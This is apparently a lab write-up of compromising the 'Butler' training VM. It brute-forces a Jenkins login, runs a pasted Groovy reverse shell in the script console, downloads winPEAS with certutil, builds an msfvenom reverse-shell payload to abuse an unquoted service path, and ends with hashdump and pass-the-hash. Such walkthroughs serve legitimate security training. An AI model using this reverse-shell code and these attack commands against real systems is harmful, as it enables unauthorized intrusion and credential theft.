Butler VM Pentest walkthrough

Disclaimer - Do not try this on a system you are not authorized to test on as you could get into legal trouble. Never do what I show you on somebodies' system without explicit approval. I am not responsible for what you do with this knowledge.

The first we thing we need to discover is the IP of the victims machine. To do this, we need to run the command "netdisocver" 
Command - "sudo netdiscover -r 192.168.44.0/24"
It looks like our target IP is going to be - 192.168.44.132
The next thing we need to do is discover what ports are open on this target system and see what services the target is running. So, we run a nmap command to do this. 
Command - "sudo nmap -n -sV -A -p- - script "default, vuln and not vulners" 192.168.44.132"
The juicy ports that I see open are the ones I highlighted in red: 
We see port 445 open, so lets enumerate this first to see if we can find a vulnerable version. 
First, we use "smbclient" to see if we can connect to the smb shares on the target computer. 
Command - "smbclient -L \\\\192.168.44.132\\ -N" 
Well, it looks like we cannot just connect to one of the targets shares. This is good. This mean this device has some level of hardening applied to it. Nevertheless, lets try some other methods to determine the version. 
We will run Metasploit. After it loads up, let's search for the SMB auxiliary that gets the version. 

Now that we are using the smb_version scanner, lets see the options needed to make this work properly. 
Looks like all we have to do is set the RHOSTS to the target machine. Everything else is already set. 
Command - set RHOSTS 192.168.44.132
AND 
Command - set VERBOSE true
It looks like this system is running SMB versions 2 & 3 and the version is 3.1.1. 
Now, while we are off trying to find an exploit for this version, lets pivot real quick to the port 8080 and see what the page is. We want to do so that if this is a webpage, we can run directory enumeration on it while we hunt for this SMB 3.1.1 exploit. 

We navigate to http://192.168.44.132 and its a Jenkins automation server. 

In any webpage, you always should check the source code, to see if there are any left over clues from the web admin. However, it looks like there are none. 
Now, Jenkins is not your typical server like Apache or Nginx. Jenkins is an open-source automation server, this is NOT a webserver, although Jenkins can host a webserver inside of it. While it does provide us with a web-based user interface to interact with, its purpose is fundamentally different from a web server. Jenkins is powered by jetty, which is a web-server engine, thus it does talk over HTTPS, thus using web scanning tools would work great here. 
Nikto results: Looks like there is an outdated version of Jetty. We will keep this in the back pocket for now.

 Nuclei results show some great info. We were able to confirm the SMB version being used which is SMB 2.1, The OS Version, the Operating system and build number and other key items. 
Another thing we will keep in our back pocket is the OS version as there might be an exploit for that. 
Now, that we have scanned against this automation server, let's do some directory enumeration, so we can go back to SMB hunting. 
Gobuster: 
Command - "gobuster dir -u http://192.168.44.132:8080 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x json,xml,php -b 403,404"
At the end of this command, I include the -x flag which targets extensions. Since Jenkins relies heavily on web API's, we should look for them under json, xml, php. We also include the -b 403,404 which basically tells gobuster to ignore these error codes. 
As you can see, it looks like it was able to find some paths

We will then run dirb against this automation server to see if there are any hidden paths as well. While this runs, we can also run dirbuster& to get another scan going for this. 
We are looking for xml, and json since Jenkins is a Java-based application running in a Java container (Jetty). Java does not use .php, so this is why we change it to xml and json. 

When we start the scan, we can go back to hunting for SMB exploits now to see if there are any version we can exploit. 

Searchsploit:
It looks like there is nothing in the exploit-db for the login version for Jenkins 

Looking in searchsploit for anything related to version 2.1 or 3.1.1 and SMB are not really getting us any hits and the results we are getting back do not seem promising either.
Lets try searching for Jetty as well from our nmap results. 
Looks like no hits either

Well SMB seems like a dead end, so lets not waste too much time on it. Lets look up any exploits for Jenkins itself now. 
Default password maybe? We will try admin/admin or admin/password 
Seems like that did not work 

Lets see what is in Metasploit for Jenkins

These two seem interesting. 
Lets try the jenkins_login one first. 

We have to set the user list and password list for it to try brute force on. 
So we create a user list with the following username: 
admin
Jenkins
root
Then we use the rockyou.txt file to be the password list. Now, this will take a long time due to trying 3 user accounts against over 14 million passwords, so for the sake of time, we will just skip this spart and put the following passwords in a word list called pass.txt
password
root
Jenkins

Looks like the login information is jenkins:jenkins
Now, you would have got this if you ran the rockyou.txt file and just added the username of Jenkins to a user list. By doing OSINT, some forums says "jenkins" as a username, thus is why if you create a user profile list with the root, admin, Jenkins; these would be good guesses to make. 
Now that we have the username and password, lets login to the automation server. 
Successful login! It looks like Jenkins:Jenkins worked!
Another option to try brute forcing is with Burp Suite. 
Burpsuite Brute-Force: 
Burpsuite is a great option for brute forcing. You can just supply it a list of usernames and passwords and it will try POST request that you can see in real time as it's a proxy. Let's break it down. 
Startup BurpSuite and navigate to the Jenkins login page. Once here, start your proxy in BurpSuite and foxy proxy web extension. 
Proxy is on in Burpsuite: 

Foxy Proxy is enabled as well in my firefox browser: 

Once these two configs are set, lets type in a random username and password in Jenkins. We will use "admin" & "admin"
We see that the login request gets captured in BurpSuite: 

From here, lets send this request to "Intruder" by right-clicking the POST method and select "Send to intruder" 

Once here, we will select "Cluster Bomb" for our attack option as this will try multiple payload sets and test every single possible combination. So if you give it 3 user accounts and 100 passwords, it will try those 3 accounts against all those passwords. 
Now that we selected cluster bomb attack, we need to highlight the payloads we wish to populate. We will select "admin" & "admin" as these are the target payloads we want because this is the username field and password field. 
Double click the "admin" name in the username field then click the add button at the top

Now on the right pane, you will see your payload position get set to admin 

Lets do the same for the "admin" password field

Now that the payloads are set, we need to populate the payloads with data. For the payload position 1 which is our username field, I will put the following names in there: admin, root, Jenkins 
Just add the names in the payload configuration section 

Now, doing some OSINT, the top 8 passwords I found for a Jenkins automation server are the following: 
admin
Jenkins
root
administrator
devops
cicd
system

So just paste those string by string in the add section under payload configuration like we did for the usernames. 
Once added, everything should look like this: 

Once this has been completed, all we have to do now is click the start attack button at the top 

And now the attack is running. Make a note that this default setup we did would be very noisy to a WAF as this is just sending a TON of POST request to a login page. Plus the user-agent from Burp suite would be easily picked up on as well since we did not configure it to use a different user agent. 
Moving along, we can see that there are a lot of attempts happening here, but we see all of the number lengths being around 400. However, we see one length that is significantly less than the rest and that is request 6. 
Now, lets compare why this number is less than the request by looking at request number 5 and compare it. Once you clikc on request number 6, click on "response" to see the reponse back section. 

Once you do this, click on request number 5 and then click back to request 6. You are just looking for things that are different. 

Request 5 gives us a cookie: 

Request 6, there is no cookie: 

In Burp Suite, the Length column shows the size of the server's response in bytes, making it the key metric for identifying successful logins. Most of my requests have a length around 406 bytes because failed attempts return an identical response redirecting to the /loginError page. Request 6 (jenkins/jenkins) is the successful login, resulting in a much shorter 183-byte response because it redirects to the clean home directory instead of the error page. Finally, the cookie differences occur because Jenkins handles failures by explicitly resetting or destroying tracking cookies (as seen in Request 5), whereas a successful authentication (Request 6) simply passes a clean redirect to the application dashboard where your active session is finalized

With that being said, we try the login creds "jenkins" & "jenkins" at the login page. Be sure to disable your foxy proxy and burp suite proxy at this stage. 
That worked! We are now in the automation server

Now that we are in the automation server, we need to click around and look for ways to remain persistent. Can we create an admin account? Can we change the current users password? 

The section I see is "Manage Jenkins" so lets click on that and see if there is anything of interest here. 
I see a few things of interest in this section now highlighted in red. You should investigate these sections, but for the sake of this walkthrough, we are going to go to the "script console" 

It looks like this takes a Groovy script to work. Maybe there is a reverse shell for Groovy script, lets search for it on Google. 
Link -> Pure Groovy/Java Reverse Shell · GitHub
Looks like this java script could be promising, so lets try it out
Script - 
String host="localhost";
int port=8044;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();

Now, change the string host to your kali box IP and you can keep the port number at 8044, unless you have a service already taking that port up. We don't, so we can keep port 8044 in use. 
So the script will now look like 
String host="192.168.44.128";
int port=8044;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();

Paste the script in the text box section.
Now, before you hit run, we need to setup a listener on our Kali machine to receive the reverse shell. 
So open up your terminal and type in "nc -lnvp 8044" 
Once this is running, then go back to your Groovy script and click on run. 
As you can now see, we have a reverse shell back on the windows operating system. 

Now, once we have this reverse shell, we need to play around in the directories and see what is on this systems account. I usually check things like Desktop, Documents, Downloads, etc.. 
So checking the Downloads directory, I see a .exe in here called "WiseCare365_5.6.7.568.exe". Something worth noting down. 

WinPeas.exe install: 
We are going to use a tool now called "winpeas.exe" which is a great tool that can run on Windows to look for ways of privilege escalation. 
To do this, we first need to get the .exe on the system. 
On your Kali box, go to this link -> Release Release refs/heads/master 20261029-a596a9f3 · peass-ng/PEASS-ng · GitHub
From here, download the winPEASx64.exe 
Once you download it, you need to transfer it over to the windows machine. 
On your Kali system, you need to start a python webserver where the winpeas.exe is. Please note, I just changed the name of the .exe to make it easier to type. 
Command for python web server - python3 -m http.server <port number> 
Now that we have a webserver hosting the file, lets go to the windows reverse shell we have to get the file using certutil. 
On the windows machine, use the command 
certutil -urlcache -f -split http://192.168.44.128:9000/winpeas.exe
File was successfully downloaded 
Now that the file has successfully been downloaded onto our system, we need to run winpeas.exe by running .\winpeas.exe 
This will do a ton of output. Go through it to get familiar with it to see what to look for and things like that. 
We have found an unquoted service path. We can leverage this exploit by knowing that when running a .exe in this unquoted service path that it would run under SYSTEM, thus giving us the highest-level access we can get on a Windows system. 
Now, let's just double check if our user account we are in has the permissions to perform this task by doing "net session". If it says "There are no entries in the list" then our current session is already elevated as an administrator. If it says "Access is denied" then this means our current command window is not elevated. 
Net session results look promising: 
We also run the commands: 
net user %username% 
net localgroup Administrators

We can confirm this user is in the admin group, so we do have the correct permissions to write. 
Let's craft a msfvenom payload to setup a reverse shell to get SYSTEM access
In Kali, we run the following command: 
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<YOUR_IP> LPORT=<YOUR_PORT> -f exe -o payload.exe
We created the file as "wise.exe" because Windows will run through the unquoted service path like this: 
C:\Program.exe
C:\Program Files.exe
C:\Program Files (x86).exe
C:\Program Files (x86)\Wise.exe 
This is why we created the payload "wise.exe" because Windows will execute this payload and it should be under as SYSTEM. 
We have transferred over the payload using the certutil command 
Now, we need to setup a meterperter listener to catch the inbound call from the target computer. 
Here is he command I use in Metasploit 
Next, hit exploit in Metasploit to run this listener
Now that its running, we head back over to the windows reverse java shell we had and run the wise.exe by using ".\wise.exe"

Now, lets go back to our Metasploit we have open
Looks like we successfully captured the session

Now, when I do the getuid command, we can see we are running as SYSTEM, which is the highest level on a windows computer. 
Now, we can use hashdump to get the hashes of the user accounts
Looks like we have a built in Admin account. We will take the hash and put it in a text file to try and crack it. But first, we need to determine what type of hash this is. 
Hash-identifier: 
Name-That-Hash:
From the results, this password hash is either from MD5 or NTLM. 
Now lets feed this to John and Hashcat to see if we can crack this hash. 
After trying John and Hahscat, we cannot crack the Admin password as it is a very complex password that is not in any dictionary attack list. 
This is fine as we can use the pash-the-hash technique to login as well. 
We use crackmapexec to see if we can get on the system using butler or Admin and it looks like we can with both. This is just a good tool to use incase you were scanning a big network. This tool just lets you validate the credentials against all the computers on the network. 
Then we use impacket-wmiexec to see if we can get access with the Admin account and have a reverse shell with SMB. 
We are able to pass the hash of the admin account to login via SMB 
We have now rooted this account in two ways.
